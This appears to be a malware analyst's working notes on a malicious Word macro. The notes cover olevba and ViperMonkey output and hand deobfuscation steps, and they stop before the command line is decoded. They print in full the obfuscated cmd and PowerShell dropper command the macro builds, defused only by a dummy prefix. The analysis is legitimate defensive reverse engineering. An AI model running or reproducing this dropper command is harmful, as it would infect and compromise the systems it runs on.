# Analyze sample1.doc file

**Quick answers**

- What does it do?
- What steps does it take to do it?


## Steps

### Extract vb code and getting info using tools
- run olevba to get a quick overview and extract code
    -  `pipenv run olevba ./Sample1.doc` to extract vb code from doc file
    - Some info: 
        - runs automatically upon opening
        - is suspicious: might run an executable, various attempts to obfuscate detected
- run ViperMonkey
    - `./docker/dockermonkey.sh ~/reversing/Sample.doc` 
        - Deobfuscation did not work that well (or I did something wrong)
        - However, a shell command was extracted, which itself is obfuscated



### Further deobfuscation by hand
I copied the output of olevba into a text/vb file for further deobfuscation using visual studio code. (plus create a git repo so I can easily undo any changes)
    - making sure code is not accidentely executed (have syntax errors, outcomment some code)
    - rename functions
    - execute safe vb code (only string operations) in excel to get return string of a function, whose only purpose to return a string (I was a bit lazy)
    - realized that the the vb code basically just puts together a string which is then used to call the command line. That output I could also get from the ViperMonkey, so there is no need to further deobfuscate the vb code. 
    - however the command line code is obfuscated

`SOMEDUMMYTOPREVENTACCIDENTALEXECUTION   Cmd /V^:^oN /r  "^Se^T ^  ^ ^J^e^4=^A^AC^AgA^AI^A^AC^A^gAA^IA^ACA^g^AA^IAACA^g^AA^I^A^ACA^gA^A^I^A^AC^A^gAQ^fA0^H^A^7BA^aA^M^GA0BQ^YA^M^G^A9^BwOAs^GAhBQZAI^HAiB^w^OAs^EA^u^B^wdA^QC^A^gA^Q^b^AU^G^A^0^B^Q^S^A0C^AlBwa^A8G^A2Bg^bAk^EA^7^A^Q^K^A^sEA^u^B^wdA^QCAgAA^LA^sE^AL^B^g^S^A^QCAo^AQZA^wGApBgRA^QGA^hBwbA^w^G^AuB^w^d^A^8^G^A^E^B^gLA^E^FA^UBgeAQC^A7B^Q^e^A^I^HA0^B^w^e^A^kC^Ar^BgeAg^F^Ak^A^A^IA4GA^pB^A^IA^sEALB^g^SA^QCAoA^AaAMG^A^hBQZAI^HAvBg^Z^A^s^DAnAQZAg^H^Al^Bg^LAcCArAge^AcFAZ^B^AJAsCAn^AAXAcCAr^A^w^Y^A^kGAsB^gYA^U^HA^wB^gOAYH^Au^B^Q^ZAQC^A9Aw^S^A^4^GA3^B^AJ^A^s^DAnA^gM^Ak^DA^2A^wJ^AACA9A^A^IA^oHA^X^B^QW^AQCA7AQKAcC^A^ABwJ^A^gC^A0BQa^A^wG^A^wB^w^UA4CAn^A^QN^AU^F^AJBgV^A^wG^AUB^AdA8^EAv^A^Q^dA^IHA^u^A^AO^A^Q^D^A^yBQY^A4^G^A^p^BgYA^8C^Av^Ag^OA^AH^A^0B^A^d^A^gG^A^A^B^gQ^A^EG^AhBg^SA^QFAv^A^QZ^AQH^ApB^wc^Ac^G^AvB^AbA^8C^An^B^gcA8GA^uA^QaA^oG^AuB^QdA^gGA^zB^wLA8CA^6^A^AcA^Q^H^A0^B^Aa^AA^EA^H^B^g^SAYGA^X^BQe^AE^EA^1^A^AWA8CA0^B^QZ^A^4GA^uAw^Z^A^4^GAvB^A^b^Ak^GA^h^B^wZ^A8CAvA^gO^AA^H^A^0^BAd^Ag^GAAB^w^dAYD^AG^B^AV
A^UD^A^s^BwL^A^s^G^AkBgLA^g^HAl^BAb^AYG^A^u^BQ^a^A0GAk^BQ^YA^8C^Av^AgO^A^AH^A^0B^AdA^g^G^A^ABAV^Ag^E^AvA^QbA8G^AjBg^LA^A^HA^1BwbA^IHAnBwaAMGAvB^gc^A^EGAo^BAcAw^GAh^BwLA8C^A6^A^Ac^A^QH^A^0B^A^a^AcC^A^9^Awa^A^oH^A^Y^B^A^JA^s^DA^0B^gbA^U^G^Ap^BA^bA^M^E^A^iB^Q^Z^AcFA^uA^AdA^UG^A^O^BA^IA^Q^HAjB^Q^Z^Ao^G^A^iB^wb^A^0CA^3B^QZA^4GA^9AQ^UA^QF^A6B^A^J^ ^e^-^ ^l^l^e^hsr^e^wo^p&    ^foR /^L  %^B ^IN  (  ^  9^25^  ^  ^-^1 ^ ^0)  D^O s^E^t   ^OQR^J=!^OQR^J!!^J^e^4:~ %^B, 1!&& I^f %^B  ^LEQ ^0 Ca^L^l  %^OQR^J:^*OQRJ^!^=%   "    `


### Deobfuscate the command line code